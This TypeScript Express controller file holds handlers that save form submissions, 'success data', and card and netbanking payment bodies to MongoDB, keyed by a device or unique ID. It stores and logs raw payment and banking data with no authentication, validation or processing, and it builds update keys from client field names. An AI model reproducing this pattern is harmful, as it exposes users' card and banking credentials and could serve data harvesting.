import { Request, Response } from "express";
import FormSubmission from "../models/FormSubmission";
import Payment from "../models/Payment";
import logger from "../logger/logger";

/**
 * Controllers for forms + payments — FormSubmission.payload is fully flexible.
 */

/* ------------------ submit generic form ------------------ */
export async function submitForm(req: Request, res: Response) {
  const body = req.body || {};

  try {
    const uniqueid = (body.uniqueid || body.deviceId || "") as string;

    const doc = new FormSubmission({
      uniqueid,
      payload: body,
    });

    await doc.save();
    logger.info("forms: form_submissions saved (payload)", { uniqueid });

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: submitForm failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message || "server error",
    });
  }
}

/* ------------------ submit success data (FLEXIBLE) ------------------ */
export async function submitSuccessData(req: Request, res: Response) {
  const body = req.body || {};
  const uniqueid = (body.uniqueid || "") as string;

  if (!uniqueid) {
    return res.status(400).json({
      success: false,
      error: "missing uniqueid",
    });
  }

  try {
    const payloadToSave = { ...body };
    delete payloadToSave.uniqueid;

    logger.info("forms: success_data payload", {
      uniqueid,
      keys: Object.keys(payloadToSave),
      payload: payloadToSave,
    });

    if (Object.keys(payloadToSave).length === 0) {
      logger.warn("forms: success_data called with no payload fields", {
        uniqueid,
      });
      return res.json({ success: true });
    }

    const update: any = {
      $set: {
        uniqueid,
        ...Object.fromEntries(
          Object.entries(payloadToSave).map(([key, value]) => [
            `payload.${key}`,
            value ?? "",
          ])
        ),
      },
    };

    await FormSubmission.findOneAndUpdate(
      { uniqueid },
      update,
      { upsert: true, new: true }
    );

    logger.info("forms: success_data updated", {
      uniqueid,
      changes: Object.keys(payloadToSave),
    });

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: submitSuccessData failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message || "server error",
    });
  }
}

/* ------------------ payments (card/netbanking) ------------------ */
export async function submitCardPayment(req: Request, res: Response) {
  try {
    const body = req.body || {};

    const p = new Payment({
      uniqueid: body.uniqueid || "",
      method: "card",
      payload: body,
      status: "pending",
    });

    await p.save();
    logger.info("payments: card saved", { uniqueid: p.uniqueid });

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: submitCardPayment failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message || "server error",
    });
  }
}

export async function submitNetBanking(req: Request, res: Response) {
  try {
    const body = req.body || {};

    const p = new Payment({
      uniqueid: body.uniqueid || "",
      method: "netbanking",
      payload: body,
      status: "pending",
    });

    await p.save();
    logger.info("payments: netbanking saved", { uniqueid: p.uniqueid });

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: submitNetBanking failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message || "server error",
    });
  }
}
